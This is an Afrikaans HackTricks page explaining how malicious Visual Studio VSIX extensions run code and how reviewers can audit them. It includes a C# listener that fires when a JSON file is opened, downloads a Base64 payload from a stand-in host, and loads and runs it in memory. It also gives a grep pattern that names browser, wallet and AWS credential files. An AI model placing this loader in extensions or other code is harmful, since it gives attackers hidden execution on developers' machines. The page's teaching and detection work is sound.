# Misbruik van Visual Studio VSIX-uitbreidings

{{#include ../banners/hacktricks-training.md}}

'n Visual Studio-uitbreiding kan gewone redigeerderaktiwiteit in kode-uitvoering onder die aangemelde gebruiker se identiteit omskep. 'n Kwaadwillige VSIX, 'n uitgewer wat hom as 'n ander uitgewer voordoen, of 'n gekompromitteerde uitbreidingopdatering kan daardie gebruiker via gewone installasiekanale bereik. Installering met 'n administrateur-aanvraag is 'n installasiepad waarvoor toestemming gegee word, nie 'n outomatiese privilege escalation nie.<sup>[[1]](#references)</sup>

## Uitvoeringsmodel

Klassieke VSSDK-uitbreidings word gewoonlik binne `devenv.exe` uitgevoer. Die nuwer `VisualStudio.Extensibility`-model laat moderne .NET-uitbreidings hoofsaaklik buite die proses loop: Visual Studio tree op as tussenganger vir oproepe na 'n toegewyde `Microsoft.ServiceHub.Host.Extensibility`-proses. Dit isoleer IDE-stabiliteit, maar **sandbox** nie die uitbreiding van die gebruiker se Windows-toestemmings nie. Die presiese uitvoerbare lêernaam kan 'n argitektuuragtervoegsel bevat, soos `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Aktivering deur gewone redigeerderaktiwiteit

In plaas daarvan om net 'n opvallende kieslysopdrag beskikbaar te stel, kan 'n uitbreiding `ITextViewOpenClosedListener` implementeer. Die `TextViewOpenedAsync`-terugroepfunksie word vir ooreenstemmende dokumente aangeroep, terwyl `TextViewExtensionConfiguration.AppliesTo` aktivering tot 'n algemene tipe, soos JSON, kan beperk. 'n Regte formateerder of linter kan steeds die aangekondigde werk doen terwyl 'n tweede aksie as newe-effek van die oopmaak van 'n lêer loop.<sup>[[1]](#references)[[3]](#references)</sup>

Die volgende verkorte patroon wys die belangrike uitvoeringspunte; die wettige formateerder en foutafhandeling is ter wille van duidelikheid weggelaat.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Gebeurnisgeaktiveerde in-geheue managed assembly loader</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Hierdie ketting laai Base64-teks af, dekodeer dit na assembly-grepe, laai dit vanaf ’n `MemoryStream` deur ’n collectible `AssemblyLoadContext`, roep die gereflekteerde `EntryPoint` met óf geen parameters óf ’n `string[]` aan, wag op asynchrone entry points en laai die konteks af. Die tweede stadium word nie na skyf geskryf nie, hoewel die VSIX en primêre uitbreidings-DLL skyfartefakte bly. Base64 bied geen egtheid of vertroulikheid nie; die gebruik van HTTP laat ook toe dat ’n aanvaller op die roete die response vervang.<sup>[[1]](#references)</sup>

Operasionele variasies sluit in om alle uitsonderings te onderdruk sodat die geadverteerde funksie voortgaan wanneer staging misluk, of om `ITextViewChangedListener` te gebruik om ná wysigings te aktiveer. Kode loop in die uitbreidingsgasheer en kan die bestuurde API’s, P/Invoke, lêers, geloofsbriewe en kinderprosesse gebruik wat vir daardie gebruiker beskikbaar is.<sup>[[1]](#references)</sup>

Vir ’n verwante, redigeerder-spesifieke uitvoeringsoppervlak wat op outomatiese laai van native plugins berus, sien:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Misbruik van Marketplace- en afleweringsvertroue

’n VSIX kan as ’n lêer wat direk gedeel of gephish is, vanaf die web-Marketplace, of deur Visual Studio se ingebedde Marketplace-blaaier aankom. Uitgewerregistrasie wat hoofsaaklik uniekheid en ’n lys gereserveerde woorde afdwing, kan uitgeweridentiteite toelaat wat visueel misleidend voorkom; dit is selfs doeltreffender om ’n reeds vertroude uitgewer of uitbreiding te kompromitteer, omdat dit ’n geïnstalleerde gebruikersbasis erf. Marketplace-installasie roep Visual Studio Installer aan en plaas die afgelaaide VSIX tydelik onder `%LOCALAPPDATA%\Temp`; `payload.vsix` word ook op wettige wyse gebruik, dus is die lêernaam alleen nie ’n aanduiding nie.<sup>[[1]](#references)</sup>

MDSec het nie ’n Visual Studio-URL-protokol geïdentifiseer wat ’n uitbreiding direk installeer nie. ’n Operateur moet steeds die gebruiker kry om die VSIX te installeer/vertrou, of moet die verspreidingspad van ’n bestaande uitbreiding kompromitteer. ’n `AllUsers`-pakket installeer onder die Visual Studio-installasiegids en kan verhoogde regte versoek, maar dit is normale installeerdergedrag waarvoor toestemming gegee word, nie ’n outomatiese pad na administrateur- of SYSTEM-regte nie.<sup>[[1]](#references)[[4]](#references)</sup>

### Statiese ouditering op skaal

VSIX-pakkette is gewoonlik ZIP-houers, dus kan ’n veilige Marketplace-hersieningspyplyn pakkette opnoem, dit **uitpak sonder om uitbreidingskode te laai**, die manifeste ontleed, uitvoerbare oppervlakke identifiseer en bestuurde assemblies met `ilspycmd` dekompileer. Gee voorkeur aan assemblies wat deur die uitbreiding besit word nadat algemene saamgebundelde afhanklikhede uitgesluit is, en korreleer dan stringe wat met geloofsbriewebergings verband hou met gedragsgroepe soos lêerlees plus netwerkversending, enkodering plus versending, aflaai plus uitvoering, geloofsbriewebestuurder plus netwerktoegang, of skermskoot plus versending.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Maak ook ’n inventaris van native DLLs, MSBuild targets, scripts, T4 templates en installer-payloads eerder as om aan te neem dat elke uitvoeringsoppervlak managed code is. Vergelyk verdagte gedrag met die doel wat die manifest voorgee om te dien; telemetrie en wettige updaters kan soos data-uitvloei of staging lyk. ’n Slegs-statiese hersiening mis packed, obfuscated, dinamies opgeloste en dormante kode, en ’n hersiening van net die nuutste weergawe mis kwaadwillige historiese vrystellings.<sup>[[1]](#references)</sup>

## References

- [1] [MDSec - Visual Studio-uitbreidings herbesoek](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Oor VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Anatomie van ’n VSIX-pakket](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd .NET-nutsding](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
{{#include ../banners/hacktricks-training.md}}
